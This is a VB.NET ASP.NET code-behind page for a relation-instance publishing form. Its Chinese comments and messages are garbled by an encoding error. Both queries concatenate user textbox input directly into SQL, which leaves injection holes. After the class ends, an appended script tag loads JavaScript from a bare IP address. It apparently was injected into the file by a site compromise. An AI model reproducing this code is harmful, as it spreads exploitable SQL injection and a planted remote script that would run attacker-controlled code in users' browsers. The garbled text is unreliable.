Imports System.Data
Imports System.Data.SqlClient

Public Class rinstancepublish
    Inherits System.Web.UI.Page

#Region " Web ������������ɵĴ��� "

    '�õ����� Web ���������������ġ�
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Label10 As System.Web.UI.WebControls.Label
    Protected WithEvents Label3 As System.Web.UI.WebControls.Label
    Protected WithEvents Label5 As System.Web.UI.WebControls.Label
    Protected WithEvents Label2 As System.Web.UI.WebControls.Label
    Protected WithEvents Label1 As System.Web.UI.WebControls.Label
    Protected WithEvents Label6 As System.Web.UI.WebControls.Label
    Protected WithEvents rbtnAccPri3 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnAccPri2 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnAccPri1 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents Label4 As System.Web.UI.WebControls.Label
    Protected WithEvents txtInstKey As System.Web.UI.WebControls.TextBox
    Protected WithEvents ddlstDefSearch As System.Web.UI.WebControls.DropDownList
    Protected WithEvents rbtnInstAvailYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnInstAvailNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents txtUser As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtOper As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtInstType As System.Web.UI.WebControls.TextBox
    Protected WithEvents btnNext As System.Web.UI.WebControls.Button
    Protected WithEvents btnCancel As System.Web.UI.WebControls.Button
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents timetext As System.Web.UI.WebControls.Label

    'ע��: ����ռλ�������� Web ���������������ġ�
    '��Ҫɾ�����ƶ�����
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: �˷��������� Web ����������������
        '��Ҫʹ�ô���༭���޸�����
        InitializeComponent()
    End Sub

#End Region

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '�ڴ˴����ó�ʼ��ҳ���û�����
        Me.lblWarning.Visible = False
        Me.timetext.Text = DateTime.Now.ToString()

        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "����û��¼�����ȵ�¼"
        Else
            Me.lblHint.Text = "���ã� " + Session("UserName")
        End If

        If Not IsPostBack Then  ' �û�x��һ�δ�ҳ��ʱ
            Me.rbtnInstAvailYes.Checked = True
            Me.rbtnAccPri1.Checked = True
            Me.txtUser.Text = Me.Session("UserName")
            Dim strSql As String
            Dim mySqlConn As New SqlConnection(Me.Application("DataBase"))
            Try
                mySqlConn.Open()

                Dim mySqlAdapter As New SqlDataAdapter("select * from rdefinition", mySqlConn)
                Dim myDateSet As New DataSet
                mySqlAdapter.Fill(myDateSet, "rdefinition")
                Me.ddlstDefSearch.DataSource = myDateSet.Tables("rdefinition").DefaultView
                Me.ddlstDefSearch.DataValueField = "rdefinitionkey"
                Me.ddlstDefSearch.DataBind()
                mySqlConn.Close()
            Catch ex As SqlException
                Throw ex
                'Response.Redirect("error.htm") ' ������ʾ
            Finally
            End Try
        End If
    End Sub

    Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCancel.Click
        Me.lblWarning.Visible = False
        Me.rbtnAccPri2.Checked = False
        Me.rbtnAccPri3.Checked = False
        Me.rbtnAccPri1.Checked = True
        Me.rbtnInstAvailNo.Checked = False
        Me.rbtnInstAvailYes.Checked = True
        Me.txtInstKey.Text = ""
        Me.txtInstType.Text = ""
        Me.txtOper.Text = ""
        Me.txtUser.Text = Me.Session("UserName")
        Me.ddlstDefSearch.SelectedIndex = 0
    End Sub

    Private Sub btnNext_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnNext.Click
        If (Me.txtInstKey.Text.Trim() = "" Or Me.txtInstType.Text.Trim() = "" Or Me.txtOper.Text.Trim() = "" Or Me.txtUser.Text.Trim() = "") Then
            Me.lblWarning.Text = "���ѣ��������ȫ����Ϣ"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim sqlReader As SqlDataReader = Nothing
        strSql = "select * from rinstance where relationkey='" + Me.txtInstKey.Text.Trim() + "'"
        ' �鿴rRefinitionKey�Ƿ��ѷ���
        Dim mySqlComm As SqlCommand
        mySqlComm = New SqlCommand(strSql, mySqlConn)
        Try
            mySqlConn.Open()
            sqlReader = mySqlComm.ExecuteReader()

            If (sqlReader.Read()) Then
                Me.lblWarning.Text = "���棺�ù�ϵ���ͱ���Ѵ��ڣ��������µĹ�ϵ���ͱ��"
                lblWarning.Visible = True
            Else
                ' ��ȡ�û�Ȩ��ֵ����Ч��ֵ,�Ƿ���Ҫ���������ȷ����Ϣ,�Ƿ�����
                ' ������chrAccPri, chrIsValid��chrNeedAff��chrIsDir��
                Dim chrAccPri As Char
                Dim chrIsValid As Char
              
                If Me.rbtnAccPri1.Checked = True Then
                    chrAccPri = "1"
                ElseIf Me.rbtnAccPri2.Checked = True Then
                    chrAccPri = "2"
                Else
                    chrAccPri = "3"
                End If
                If Me.rbtnInstAvailYes.Checked = True Then
                    chrIsValid = "1"
                Else
                    chrIsValid = "0"
                End If

                ' ����������
                strSql = [String].Format("Insert into rinstance values('{0}','{1}','{2}','{3}','{4}','{5}','{6}','{7}','{8}','{9}')", _
                    Me.txtInstKey.Text.Trim(), Me.ddlstDefSearch.SelectedValue.Trim(), chrAccPri, _
                    Now.ToString("yyyy-MM-dd HH:mm:ss"), Now.ToString("yyyy-MM-dd HH:mm:ss"), _
                    Now.ToString("yyyy-MM-dd HH:mm:ss"), Me.txtUser.Text.Trim(), _
                    Me.txtOper.Text.Trim(), Me.txtInstType.Text.Trim(), chrIsValid)
                mySqlConn.Close()
                mySqlComm.CommandText = strSql
                mySqlConn.Open()
                If (mySqlComm.ExecuteNonQuery() > 0) Then
                    Me.lblWarning.Text = "��ϲ����ӹ�ϵʵ���ɹ�" + Me.txtInstKey.Text.Trim() + "�ɹ�"
                    Me.lblWarning.Visible = True
                    Me.Session("InstKey") = Me.txtInstKey.Text.Trim()
                    Me.Session("DefKey") = Me.ddlstDefSearch.SelectedValue.Trim()
                    Me.Response.Redirect("addrvertex.aspx")
                Else
                    Me.lblWarning.Text = "���棺����ĳ��ԭ����ӹ�ϵʵ��ʧ�ܣ�������û��Ȩ��"
                    Me.lblWarning.Visible = True
                End If
            End If
            sqlReader.Close()
            mySqlConn.Close()
        Catch ex As SqlException
            If sqlReader.IsClosed = False Then
                sqlReader.Close()
                mySqlConn.Close()
            End If
            Throw ex
            'Response.Redirect("error.htm") ' ������ʾ
        Finally
        End Try
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
